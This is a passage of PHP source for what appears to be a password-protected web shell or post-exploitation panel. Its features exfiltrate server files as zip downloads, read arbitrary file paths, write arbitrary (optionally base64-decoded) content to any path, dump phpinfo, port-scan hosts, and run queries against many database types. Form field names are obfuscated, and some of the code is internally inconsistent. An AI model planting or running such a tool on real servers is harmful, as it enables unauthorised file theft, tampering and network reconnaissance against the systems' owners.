                        $path_replacement,
                        '',
                        preg_replace(
                            "\\",
                            "/",
                            basename($path)
                        )  // Replace backslashes with forward slashes
                    ) // Remove common path from filename
                );
            }
            elseif (is_dir($path) && is_readable($path)) {
                NaddDirectoryToZip(
                    $path,
                    $zip,
                    $recursive,
                    $extensions,
                    $path_replacement . DIRECTORY_SEPARATOR
                );
            }
        }
    }

    $zip->close();

    $file_size = filesize($zip_name);
    NchunkedDownload($zip_name, $file_size, "export.zip");

    // Delete temporary zip file;
    unlink($zip_name);
}

/**
 * Hook the isolated operations to add the current operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NexfiltrateHooksIsolatedOps(&$isolated_ops) {
    global $EXFILTRATE;

    $isolated_ops[] = $EXFILTRATE;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NexfiltrateHooksFeatures(&$features) {
    global $EXFILTRATE;

    $features[] = array(
        "title"       => "Exfiltrate",
        "description" => "Exfiltrate data from the server in a password protected zip archive.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
</svg>',
        "op"          => $EXFILTRATE,
    );
}


/**
 * Make the file extraction page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeFileExtractionPage(&$page_content, $features, $page, $css) {
    global $FILE_EXTRACTION_PREVIEW, $FILE_EXTRACTION;
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "text",
                        "Path",
                        "c69",
                        "C://path/to/file.txt",
                        "Fully qualified path to the file to extract.",
                        true,
                        "L88"
                    ),
                    NmakeCheckbox(
                        "x45",
                        "Preview",
                        "Display preview of the file content if it's larger than 100kb.",
                        $page === $FILE_EXTRACTION_PREVIEW,
                        "y",
                        $page === $FILE_EXTRACTION_PREVIEW
                            ? "window.location.href = '?page=" . urlencode($FILE_EXTRACTION) .
                              "&L88=' + encodeURIComponent(document.getElementById('c69').value)"
                            : "window.location.href = '?page=" . urlencode($FILE_EXTRACTION_PREVIEW) .
                              "&L88=' + encodeURIComponent(document.getElementById('c69').value)"
                    ),
                    NmakeCheckbox(
                        "O29",
                        "Export",
                        "Export the file even if larger than 100kb."
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the file extraction operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NhandleFileExtraction($operation, $features) {
    $filepath = $_POST['c69'];
    $preview  = strtolower($_POST['x45']) === "y";
    $export   = strtolower($_POST['O29']) === "y";

    // sanitize the file path for display
    $sanitized_filepath = htmlentities($filepath);

    // check if the file exists
    if (!file_exists($filepath)) {
        echo "Error: File '$sanitized_filepath' does not exist.\n";
        return;
    }

    // get the file size
    $filesize = filesize($filepath);

    // output some file information
    echo "Reading file '$sanitized_filepath'\n";
    echo "File size: " . NformatBytes($filesize) . "\n";

    // if preview is enabled, read the first 10Kb of the file
    if ($preview) {
        $preview_content = fopen($filepath, "r");
        $read            = fread($preview_content, 10240); // Read 10Kb

        fclose($preview_content);

        echo "Preview:\n" . htmlentities($read) . "\n";
        return;
    }

    // if the file is less than 100Kb, read the entire file
    if ($filesize < 102400) { // Less than 100Kb
        NchunkedDownload($filepath, $filesize);
    }
    // if export is enabled, read the entire file even if it's larger than 100Kb
    elseif ($export) {
        NchunkedDownload($filepath, $filesize);
    }
    // if the file is larger than 100Kb and export is not enabled, display an error message
    else {
        echo "Error: File '$sanitized_filepath' is larger than 100kb. Use the export option to download the file.\n";
    }
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NfileExtractionHooksIsolatedOps(&$isolated_ops) {
    global $FILE_EXTRACTION;

    $isolated_ops[] = $FILE_EXTRACTION;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NfileExtractionHooksFeatures(&$features) {
    global $FILE_EXTRACTION, $FILE_EXTRACTION_PREVIEW;

    $features[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $FILE_EXTRACTION,
    );
    $features[] = array(
        "title"       => "File extraction",
        "description" => "Extract file content as base64.",
        "svg"         => '',
        "hidden"      => true,
        "op"          => $FILE_EXTRACTION_PREVIEW,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeWriteFilePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "text",
                        "Path",
                        "c69",
                        "C://path/to/file.txt",
                        "Fully qualified path where the file will be written.",
                        true
                    ),
                    NmakeInput(
                        "textarea",
                        "File content",
                        "x45",
                        "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                        "Content of the file to write to disk.",
                        true
                    ),
                    NmakeCheckbox(
                        "O29",
                        "Decode from base64",
                        "Decode the content of the file from base64 before writing it to disk."
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandleWriteFile($operation, $features) {
    $filename               = $_POST['c69'];
    $should_decode_from_b64 = NisCheckboxActive("O29");
    $content                = $should_decode_from_b64 ? base64_decode($_POST['x45']) : $_POST['x45'];

    echo "Received content of length " . strlen($content) . " bytes.";
    echo "Writing to " . htmlentities($filename) . "...";
    flush();

    file_put_contents($filename, $content);
    echo "File written successfully.";
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NfileWriteHooksFeatures(&$features) {
    global $WRITE_FILE;

    $features[] = array(
        "title"       => "Write file",
        "description" => "Write a file to the given path, writing permission are required.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
</svg>',
        "op"          => $WRITE_FILE,
    );
}


/**
 * Create the login page
 */
function NmakeLoginPage(&$page_content, $features, $page, $css) {
    $username = !empty($_GET["username"]) ? htmlentities($_GET["username"]) : false;
    $error    = !empty($_GET["error"]) ? htmlentities($_GET["error"]) : false;

    ob_start();
    ?>
    <html lang="en" class="h-full bg-zinc-900">
    <head>
        <title>=wI/v</title>
        <style><?= $css ?></style>
        <script>u5
            ]^
            1</script>
    </head>
    <body class="h-full">
    <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
        <div class="sm:mx-auto sm:w-full sm:max-w-sm">
            <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
                Sign in to your account
            </h2>
        </div>

        <?php if ($error): ?>
            <div class="mt-4 sm:mx-auto sm:w-full sm:max-w-sm">
                <div class="bg-red-500 p-3 rounded-md text-white text-center">
                    <?php echo $error ?>
                </div>
            </div>
        <?php endif; ?>

        <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
            <form class="space-y-6" action="<?= $_SERVER["REQUEST_URI"]; ?>" method="post">
                <input type="hidden" name="i94" value="<?= $page ?>"/>
                <div>
                    <label for="c69" class="block text-sm font-medium leading-6 text-white">
                        Username
                    </label>
                    <div class="mt-2">
                        <input id="c69" name="c69" type="text" autocomplete="c69" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="admin"
                            <?php if ($username) {
                                echo "value=\"$username\"";
                            } ?>
                        >
                    </div>
                </div>
                <div>
                    <div class="flex items-center justify-between">
                        <label for="x45" class="block text-sm font-medium leading-6 text-white">
                            Password
                        </label>
                    </div>
                    <div class="mt-2">
                        <input id="x45" name="x45" type="password" autocomplete="x45" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
                        >
                    </div>
                </div>
                <div>
                    <button type="submit"
                            class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
                        Sign in
                    </button>
                </div>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php
    $page_content = ob_get_clean();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandleLogin($operation, $features) {
    global $SALT, $PASSWORD, $USERNAME;

    // loads the username and password from the POST request and hashes them
    $username = hash("sha512", $_POST["c69"] . $SALT);
    $password = hash("sha512", $_POST["x45"] . $SALT);

    // checks if the username and password are correct
    if ($username === $USERNAME && $password === $PASSWORD) {
        // if the username and password are correct, set the auth session variable to true
        $_SESSION["auth"] = true;

        // redirect the user to the second feature page
        header("Location: ?page=" . urlencode($features[1]["op"]), true, 301);
        return;
    }

    // if the username and password are incorrect, redirect the user to the login page
    header(
        "Location: ?page=$operation&username=" . urlencode($_POST["c69"]) .
        "&error=" . urlencode("Invalid username or password"),
        true,
        301
    );
}

/**
 * Hook the page generation to check if the user is authenticated
 *
 * @return void
 */
function NloginHooksPageGeneration() {
    global $LOGIN;

    // Check if the user is authenticated
    if ($_SESSION["auth"] !== true) {
        header("Location: ?page=" . $LOGIN);
        die;
    }

    // if the user is authenticated simply continues
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function NloginHooksIsolatedOps(&$isolated_ops) {
    global $LOGIN;

    $isolated_ops[] = $LOGIN;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NloginHooksFeatures(&$features) {
    global $LOGIN;

    // Emplace the login feature at the beginning of the features array to make sure its picked as the fallback route if
    // none is defined
    array_unshift(
        $features,
        array(
            "name"        => "Login",
            "description" => "A simple login page",
            "hidden"      => true,
            "op"          => $LOGIN,
        )
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakePhpInfoPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    ob_start();
    phpinfo();
    $php_info     = ob_get_clean();
    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            "<div class='grid grid-cols-2 gap-8 mt-8'>
                        <div>
                            <div id='phpinfo-container' class='max-w-full overflow-x-auto'></div>
                            <script>
                                const container = document.getElementById('phpinfo-container');
                                const shadow_root = container.attachShadow({mode: 'open'});
                                shadow_root.innerHTML = `$php_info`;
                            </script>
                        </div>
                        <div>
                            " . NlistEnabledExtensions() . "
                        </div>
                    </div>",
        )
    );
}

/**
 * List all enabled extensions
 *
 * @return string
 */
function NlistEnabledExtensions() {
    $extensions = get_loaded_extensions();
    $content    = NopenCommandOutputScreen(
        true,
        "max-h-96 overflow-y-scroll mb-8",
        "Enabled extensions",
        true,
        true
    );
    foreach ($extensions as $extension) {
        $content .= "- $extension\n";
    }
    $content .= NcloseCommandOutputScreen(true);
    return $content;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NphpInfoHooksFeatures(&$features) {
    global $PHP_INFO;

    $features[] = array(
        "title"       => "PHP Info",
        "description" => "Display PHP information.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
</svg>',
        "op"          => $PHP_INFO,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakePortScanPage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeInput(
                        "text",
                        "Host",
                        "c69",
                        "localhost",
                        "The host to connect to",
                        true
                    ),
                    NmakeInput(
                        "number",
                        "Starting port",
                        "x45",
                        "1",
                        "Starting port of the scan (included)",
                        true
                    ),
                    NmakeInput(
                        "number",
                        "Ending port",
                        "O29",
                        "65535",
                        "Ending port of the scan (included)",
                        true
                    ),
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandlePortScan($operation, $features) {
    $host      = $_POST['c69'];
    $startPort = intval($_POST['x45']);
    $endPort   = intval($_POST['O29']);

    echo "Scanning ports $startPort to $endPort on " . htmlentities($host) . "...\n";

    // Loop through the port range
    for ($port = $startPort; $port <= $endPort; $port++) {
        // Attempt to connect to the host on the current port
        $socket = @fsockopen($host, $port, $errno, $errstr, 1);

        // Check if the connection was successful
        if ($socket) {
            // The port is open
            fclose($socket);
            echo "Port $port: OPEN\n";
        }
        else {
            // The port is closed or unreachable
            echo "Port $port: CLOSED / UNREACHABLE (err: $errstr)\n";
        }
        flush();
    }
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function NportScanHooksFeatures(&$features) {
    global $PORT_SCAN;

    $features[] = array(
        "title"       => "Port scan",
        "description" => "Scan a given range of TCP ports using connect method.",
        "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
  <path stroke-linecap="round" stroke-linejoin="round" d="M12 9v3.75m0-10.036A11.959 11.959 0 0 1 3.598 6 11.99 11.99 0 0 0 3 9.75c0 5.592 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.57-.598-3.75h-.152c-3.196 0-6.1-1.25-8.25-3.286Zm0 13.036h.008v.008H12v-.008Z" />
</svg>',
        "op"          => $PORT_SCAN,
    );
}


/**
 * Create the example page
 *
 * @param $page_content string The page content container
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 * @param $page string The current page
 * @param $css string The CSS of the page
 */
function NmakeQueryDatabasePage(&$page_content, $features, $page, $css) {
    $feature = array_values(
        array_filter(
            $features,
            function ($feature) use ($page) {
                return $feature["op"] === $page;
            }
        )
    );

    $page_content = NmakePage(
        $features,
        $css,
        $page,
        array(
            NmakePageHeader(
                $feature[0]["title"],
                $feature[0]["description"]
            ),
            NmakeForm(
                $page,
                $_SERVER["REQUEST_URI"],
                array(
                    NmakeSelect(
                        "Database",
                        "c69",
                        array(
                            [
                                "value"    => "mysql",
                                "label"    => "MySQL",
                                "disabled" => !extension_loaded("mysql") &&
                                              !extension_loaded("mysqli") &&
                                              !extension_loaded("pdo_mysql"),
                            ],
                            [
                                "value"    => "cubrid",
                                "label"    => "CUBRID",
                                "disabled" => !extension_loaded("cubrid") &&
                                              !extension_loaded("pdo_cubrid"),
                            ],
                            [
                                "value"    => "pgsql",
                                "label"    => "PostgreSQL",
                                "disabled" => !extension_loaded("pgsql") &&
                                              !extension_loaded("pdo_pgsql"),
                            ],
                            [
                                "value"    => "sqlite",
                                "label"    => "SQLite",
                                "disabled" => !extension_loaded("sqlite3") &&
                                              !extension_loaded("pdo_sqlite"),
                            ],
                            [
                                "value"    => "sqlsrv",
                                "label"    => "SQL Server",
                                "disabled" => !extension_loaded("sqlsrv") &&
                                              !extension_loaded("pdo_sqlsrv"),
                            ],
                            [
                                "value"    => "oci",
                                "label"    => "Oracle",
                                "disabled" => !extension_loaded("oci8") &&
                                              !extension_loaded("pdo_oci"),
                            ],
                            [
                                "value"    => "mongodb",
                                "label"    => "MongoDB",
                                "disabled" => !extension_loaded("mongo") &&
                                              !extension_loaded("mongodb"),
                            ],
                            [
                                "value"    => "ibm",
                                "label"    => "IBM DB2",
                                "disabled" => !extension_loaded("ibm_db2") &&
                                              !extension_loaded("pdo_ibm"),
                            ],
                            [
                                "value"    => "firebird",
                                "label"    => "Firebird/Interbase",
                                "disabled" => !extension_loaded("interbase") &&
                                              !extension_loaded("pdo_firebird"),
                            ],
                            [
                                "value"    => "odbc",
                                "label"    => "ODBC",
                                "disabled" => !extension_loaded("odbc") &&
                                              !extension_loaded("pdo_odbc"),
                            ],
                            [
                                "value"    => "informix",
                                "label"    => "Informix",
                                "disabled" => !extension_loaded("pdo_informix"),
                            ],
                            [
                                "value"    => "sybase",
                                "label"    => "Sybase",
                                "disabled" => !extension_loaded("sybase") &&
                                              !extension_loaded("mssql") &&
                                              !extension_loaded("pdo_dblib"),
                            ],
                            [
                                "value"    => "raw",
                                "label"    => "Raw PDO connection string",
                                "disabled" => !extension_loaded("pdo"),
                                "selected" => true,
                            ],
                        ),
                        true,
                        "Database driver not available."
                    ),
                    NmakeInput(
                        "text",
                        "Host",
                        "x45",
                        "localhost",
                        "The host to connect to (default: localhost)"
                    ),
                    NmakeInput(
                        "number",
                        "Port",
                        "O29",
                        "3306",
                        "
                                    The port to connect to, default depend on the database
                                    <ul class='text-sm text-zinc-500 list-disc list-inside'>
                                        <li>MySQL (default: 3306)</li>
                                        <li>CUBRID (default: 30000)</li>
                                        <li>PostgreSQL (default: 5432)</li>
                                        <li>SQLite (default: None)</li>
                                        <li>SQL Server (default: 1433)</li>
                                        <li>Oracle (default: 1521)</li>
                                        <li>MongoDB (default: 27017)</li>
                                        <li>IBM DB2 (default: 50000)</li>
                                        <li>Firebird/Interbase (default: 3050)</li>
                                        <li>ODBC (default: None)</li>
                                        <li>Informix (default: 9800)</li>
                                        <li>Sybase (default: 5000)</li>
                                    </ul>"
                    ),
                    NmakeInput(
                        "text",
                        "Username",
                        "t14",
                        "admin",
                        "The username to connect with.",
                        true
                    ),
                    NmakeInput(
                        "password",
                        "Password",
                        "q39",
                        "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                        "The password to connect with.",
                        true
                    ),
                    NmakeInput(
                        "text",
                        "Database",
                        "C67",
                        "ExampleDB",
                        "The database to connect to."
                    ),
                    NmakeInput(
                        "text",
                        "Charset",
                        "z99",
                        "utf8",
                        "The charset to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Service name",
                        "n55",
                        "orcl",
                        "The service name to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "SID",
                        "Q62",
                        "orcl",
                        "The SID to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Options",
                        "l15",
                        "ssl=true",
                        "The options to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Role",
                        "i02",
                        "SYSDBA",
                        "The role to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Dialect",
                        "O71",
                        "3",
                        "The dialect to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Protocol",
                        "z47",
                        "onsoctcp",
                        "The protocol to use for the connection."
                    ),
                    NmakeCheckbox(
                        "L64",
                        "Enable scrollable cursors",
                        "Enable scrollable cursors for the connection.",
                        true,
                        "1"
                    ),
                    NmakeInput(
                        "text",
                        "ODBC driver",
                        "u67",
                        "ODBC Driver 17 for SQL Server",
                        "The ODBC driver to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Raw connection string",
                        "p33",
                        "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
                        "The raw connection string to use for the connection."
                    ),
                    NmakeInput(
                        "text",
                        "Server",
                        "S44",
                        "ol_informix1170",
                        "The Informix server name to use for the connection."
                    ),
                    NmakeInput(
                        "textarea",
                        "Query",
                        "V64",
                        "SHOW DATABASES",
                        "The query to run against the database. Leave empty to perform a connection test."
                    ),
                    NmakeInput(
                        "text",
                        "Collection",
                        "K11",
                        "users",
                        "The collection to query against for MongoDB."
                    ),
                    '<script>
                        function NhideAll() {
                            for (let i = 2; i <= 17; i++) {
                                document.getElementById(`__PARAM_${i}__-container`).classList.add(`hidden`);
                            }
                            
                            document.getElementById(`K11-container`).classList.add(`hidden`);
                        }
                        
                        function NshowRange(start, end) {
                            for (let i = start; i <= end; i++) {
                                document.getElementById(`__PARAM_${i}__-container`).classList.remove(`hidden`);
                            }
                        }
                        
                        hideAll();
                        showRange(16, 16);
                        const select = document.getElementById(`c69`);
                        select.addEventListener(`change`, (event) => {
                           const value = event.target.value;
                           hideAll()
                            
                           switch (value) {
                                case `raw`:
                                    showRange(16, 16);
                                    break;
                                case `mysql`:
                                case `cubrid`:
                                    showRange(2, 7);
                                    break;
                                case `pgsql`:
                                case `sqlsrv`:
                                case `ibm`:
                                case `sybase`:
                                    showRange(2, 6);
                                    break;
                                case `sqlite`:
                                    showRange(2, 2);
                                    showRange(4, 5);
                                    break;
                                case `oci`:
                                    showRange(2, 5);
                                    showRange(8, 9);
                                    break;
                                case `mongodb`:
                                    showRange(2, 6);
                                    showRange(10, 10);
                                    showRange(19, 19);
                                    break;
                                case `firebird`:
                                    showRange(2, 7);
                                    showRange(11, 12);
                                    break;
                                case `odbc`:
                                    showRange(2, 6);
                                    showRange(15, 15);
                                    break;
                                case `informix`:
                                    showRange(2, 6);
                                    showRange(13, 14);
                                    showRange(17, 17);
                                    break;
                           }
                        });
                    </script>',
                )
            ),
        )
    );
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function NhandleQueryDatabase($operation, $features) {
    NconnectAndQueryDatabase(
        $_POST["c69"],
        $_POST["t14"],
        $_POST["q39"],
        !empty($_POST["x45"]) ? $_POST["x45"] : "localhost",
        !empty($_POST["O29"]) ? intval($_POST["O29"]) : null,
        $_POST["n55"],
        $_POST["Q62"],
        $_POST["C67"],
        $_POST["z99"],
        $_POST["l15"],
        $_POST["i02"],
        $_POST["O71"],
        $_POST["u67"],
        $_POST["S44"],
        !empty($_POST["z47"]) ? $_POST["z47"] : "onsoctcp",
        $_POST["L64"],
        $_POST["p33"],
        $_POST["V64"],
        $_POST["K11"]
    );
}

/**
 * Run a PDO query and output the results
 *
 * @param $pdo PDO PDO connection to use
 * @param $query string Query to run
 *
 * @return void
 */
function NrunPDOQuery($pdo, $query) {
    $stmt = $pdo->query($query);
    if ($stmt) {
        $result = $stmt->fetchAll(PDO::FETCH_ASSOC);
        if ($result) {
            echo "[Driver: PDO] Query executed successfully.\n";
            NprintAsciiTable($result);
        }
        else {
            echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
        }
    }
    else {
        echo "[Driver: PDO] Query failed: " . json_encode($pdo->errorInfo()) . "\n";
    }
}

/**
 * Connect to a database using the given credentials and return the connection
 *
 * @param $db_type string Database type
 * @param $username string Username to connect with
 * @param $password string Password to connect with
 * @param $host string Host to connect to
 * @param $port int|null Port to connect to
 * @param $service_name string|null Service name to use for connection
 * @param $sid string|null SID to use for connection
 * @param $database string|null Database to connect to
 * @param $charset string|null Charset to use for connection
 * @param $options string|null Options to use for connection
 * @param $role string|null Role to use for connection
 * @param $dialect string|null Dialect to use for connection
 * @param $odbc_driver string|null ODBC driver to use for connection
 * @param $server string|null Informix server name
 * @param $protocol string Protocol to use for connection
 * @param $enableScrollableCursors string|null Whether to enable scrollable cursors
 * @param $raw_connection_string string Raw connection string to use for connection
 * @param $query string|null Query to run
 * @param $collection string|null Collection to use for connection
 *
 * @return void
 */
function NconnectAndQueryDatabase(
    $db_type,
    $username,
    $password,
    $host = 'localhost',
    $port = null,
    $service_name = null,
    $sid = null,
    $database = null,
    $charset = null,
    $options = null,
    $role = null,
    $dialect = null,
    $odbc_driver = null,
    $server = null,
    $protocol = "onsoctcp",
    $enableScrollableCursors = null,
    $raw_connection_string = "",
    $query = null,
    $collection = null
) {
    if ($db_type === 'mysql') {
        $port = $port ?: 3306;

        // Check if the MySQL extension is loaded
        if (extension_loaded("mysql")) {
            $connection = mysql_connect("$host:$port", $username, $password);

            if (!$connection) {
                echo "[Driver: mysql] Connection failed: " . htmlentities(mysql_error());
            }
            else {
                echo "[Driver: mysql] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;

                if (!empty($query)) {
                    $result = mysql_query($query, $connection);
                    echo "[Driver: mysql] Query executed successfully.\n";
                    if ($result) {
                        $rows = array();
                        while ($row = mysql_fetch_assoc($result)) {
                            $rows[] = $row;
                        }
                        NprintAsciiTable($rows);
                    }
                    else {
                        echo "[Driver: mysql] Query failed: " . htmlentities(mysql_error());
                    }
                }
            }
        }
        // Check if the MySQLi extension is loaded
        elseif (extension_loaded("mysqli")) {
            mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);

            try {
                $connection = mysqli_connect($host, $username, $password, $database, $port);

                if (!$connection) {
                    echo "[Driver: mysqli] Connection failed: " . htmlentities(mysqli_connect_error());
                }
                else {
                    echo "[Driver: mysqli] Connected successfully using " .
                         htmlentities($username) .
                         ":" .
                         htmlentities($password) .
                         PHP_EOL;

                    if (!empty($query)) {
                        $result = mysqli_query($connection, $query);
                        if ($result) {
                            echo "[Driver: mysqli] Query executed successfully.\n";
                            $rows = array();
                            while ($row = mysqli_fetch_assoc($result)) {
                                $rows[] = $row;
                            }
                            NprintAsciiTable($rows);
                        }
                        else {
                            echo "[Driver: mysql] Query failed: " . htmlentities(mysqli_error($connection));
                        }
                    }
                }
            }
            catch (mysqli_sql_exception $e) {
                echo "[Driver: mysqli] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the PDO MySQL extension is loaded
        elseif (extension_loaded("pdo_mysql")) {
            try {
                $dsn = "mysql:host=$host;port=$port" .
                       (!empty($database) ? ";dbname=$database" : "") .
                       (!empty($charset) ? ";charset=$charset" : "");

                $pdo = new PDO($dsn, $username, $password);
                echo "[Driver: pdo_mysql] Connected successfully using " .
                     htmlentities($username) .
                     ":" .
                     htmlentities($password) .
                     PHP_EOL;

                if (!empty($query)) {
                    NrunPDOQuery($pdo, $query);
                }
            }
            catch (PDOException $e) {
                echo "[Driver: pdo_mysql] Connection failed: " . htmlentities($e->getMessage());
            }
        }
        // Check if the PDO extension is loaded but the PDO MySQL driver is not installed
        elseif (extension_loaded("pdo")) {
